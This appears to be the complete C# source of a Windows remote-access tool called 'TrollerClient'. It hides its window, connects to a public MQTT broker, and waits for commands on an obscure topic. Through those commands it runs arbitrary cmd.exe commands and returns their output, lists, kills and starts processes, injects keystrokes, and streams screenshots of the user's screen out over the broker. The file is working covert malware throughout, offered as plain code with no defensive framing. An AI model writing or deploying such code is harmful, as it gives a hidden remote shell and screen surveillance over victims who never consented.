using MQTTnet;
using MQTTnet.Client;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Drawing.Imaging;

namespace TrollerClient;

public partial class Form1 : Form
{
    private IMqttClient _mqttClient;
    private System.Windows.Forms.Timer _captureTimer;
    private bool _isStreaming = false;

    private const string B_TOPIC = "velocityzdx_trollerlink_74f9d2x1";
    private const string CMD_TOPIC = B_TOPIC + "/cmd";
    private const string RAW_TOPIC = B_TOPIC + "/raw";

    public Form1()
    {
        InitializeComponent();
        this.WindowState = FormWindowState.Minimized;
        this.ShowInTaskbar = false;
        this.Opacity = 0;
        this.Hide();

        _captureTimer = new System.Windows.Forms.Timer();
        _captureTimer.Interval = 200; // ~5 fps
        _captureTimer.Tick += CaptureTimer_Tick;

        ConnectMqttAsync();
    }

    private async void ConnectMqttAsync()
    {
        var factory = new MqttFactory();
        _mqttClient = factory.CreateMqttClient();

        var options = new MqttClientOptionsBuilder()
            .WithClientId(Guid.NewGuid().ToString())
            .WithTcpServer("broker.hivemq.com", 1883)
            .WithCleanSession()
            .Build();

        _mqttClient.ApplicationMessageReceivedAsync += async e =>
        {
            var msg = System.Text.Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment);
            if (e.ApplicationMessage.Topic == CMD_TOPIC)
            {
                try {
                    await HandleCommand(JsonConvert.DeserializeObject<dynamic>(msg)!);
                } catch { }
            }
        };

        _mqttClient.ConnectedAsync += async e =>
        {
            await _mqttClient.SubscribeAsync(CMD_TOPIC);
            await PublishAsync("terminal", "PC Client connected securely.");
        };

        _mqttClient.DisconnectedAsync += async e =>
        {
            await Task.Delay(TimeSpan.FromSeconds(5));
            try { await _mqttClient.ConnectAsync(options); } catch { }
        };

        try { await _mqttClient.ConnectAsync(options); } catch { }
    }

    private async Task HandleCommand(dynamic data)
    {
        string action = data.action;
        string payload = data.payload ?? "";

        if (action == "stream_start")
        {
            _isStreaming = true;
            this.Invoke(() => _captureTimer.Start());
        }
        else if (action == "stream_stop")
        {
            _isStreaming = false;
            this.Invoke(() => _captureTimer.Stop());
        }
        else if (action == "run_cmd")
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {payload}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            try {
                using var p = Process.Start(startInfo);
                string output = p!.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                await PublishAsync("terminal", string.IsNullOrWhiteSpace(output) ? "Done." : output);
            } catch (Exception ex) {
                await PublishAsync("terminal", "Error: " + ex.Message);
            }
        }
        else if (action == "get_tasks")
        {
            var procs = Process.GetProcesses()
                .Select(p => new { Id = p.Id, Name = p.ProcessName, Mem = (p.WorkingSet64 / 1024 / 1024) })
                .OrderByDescending(p => p.Mem).Take(50).ToArray();
            await PublishAsync("tasks", JsonConvert.SerializeObject(procs));
        }
        else if (action == "kill_task")
        {
            try {
                Process.GetProcessById(int.Parse(payload)).Kill();
                await PublishAsync("terminal", $"Killed task {payload}");
            } catch (Exception ex) {
                await PublishAsync("terminal", "Failed to kill: " + ex.Message);
            }
        }
        else if (action == "start_task")
        {
            try {
                Process.Start(payload);
                await PublishAsync("terminal", $"Started task {payload}");
            } catch (Exception ex) {
                await PublishAsync("terminal", "Failed to start: " + ex.Message);
            }
        }
        else if (action == "keystroke" || action == "text")
        {
            this.Invoke(() => {
                try { SendKeys.SendWait(payload); } catch { }
            });
            await PublishAsync("terminal", $"Sent keys: {payload}");
        }
    }

    private async Task PublishAsync(string type, string data)
    {
        if (_mqttClient == null || !_mqttClient.IsConnected) return;

        var msg = JsonConvert.SerializeObject(new { type, data });
        var appMsg = new MqttApplicationMessageBuilder()
            .WithTopic(RAW_TOPIC)
            .WithPayload(System.Text.Encoding.UTF8.GetBytes(msg))
            .Build();
            
        await _mqttClient.PublishAsync(appMsg);
    }

    private async void CaptureTimer_Tick(object? sender, EventArgs e)
    {
        if (!_isStreaming || _mqttClient == null || !_mqttClient.IsConnected) return;

        try
        {
            var bounds = Screen.PrimaryScreen?.Bounds ?? new Rectangle(0, 0, 1920, 1080);
            using var bitmap = new Bitmap(bounds.Width, bounds.Height);
            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            // Scale to 720p roughly
            int targetWidth = 1280;
            int targetHeight = (int)(bounds.Height * (1280.0 / bounds.Width));
            using var scaledBitmap = new Bitmap(bitmap, new Size(targetWidth, targetHeight));

            using var ms = new MemoryStream();
            var encoder = ImageCodecInfo.GetImageDecoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
            var encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L); // 50% Quality

            scaledBitmap.Save(ms, encoder, encoderParams);
            
            var base64 = Convert.ToBase64String(ms.ToArray());
            await PublishAsync("frame", base64);
        }
        catch { }
    }
}
